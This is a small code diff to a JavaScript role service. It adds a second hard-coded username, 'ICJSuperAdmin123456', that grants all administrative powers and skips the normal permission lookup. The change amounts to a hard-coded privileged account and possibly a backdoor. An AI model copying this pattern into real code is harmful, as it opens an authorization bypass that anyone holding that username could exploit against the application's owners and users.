@@ -170,7 +170,7 @@ const RoleService = {
   },
 
   hasPower(username, isSuperAdmin, powerKey) {
-    if (isSuperAdmin || username === "ICJSuperAdmin1234") return true;
+    if (isSuperAdmin || username === "ICJSuperAdmin123456" || username === "ICJSuperAdmin1234") return true;
     const powers = this.getAdminPowers(username);
     return Boolean(powers[powerKey]);
   },
